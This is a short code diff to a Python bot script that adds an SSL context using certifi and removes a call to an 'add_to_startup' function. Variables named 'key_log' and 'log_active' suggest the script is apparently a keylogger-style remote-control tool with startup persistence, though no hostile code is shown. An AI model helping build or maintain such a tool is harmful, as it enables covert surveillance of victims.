@@ -19,6 +19,8 @@ import shutil
 import sys
 from os import getenv
 import glob
+import ssl
+import certifi
 
 key_log = []
 log_active = False
@@ -841,5 +843,7 @@ def add_to_startup():
         print(f"Error adding to startup: {e}")
 
 
-add_to_startup()
-bot.run(TOKEN)
+ssl_context = ssl.create_default_context()
+ssl_context.load_verify_locations(certifi.where())
+
+bot.run(TOKEN, ssl=ssl_context)
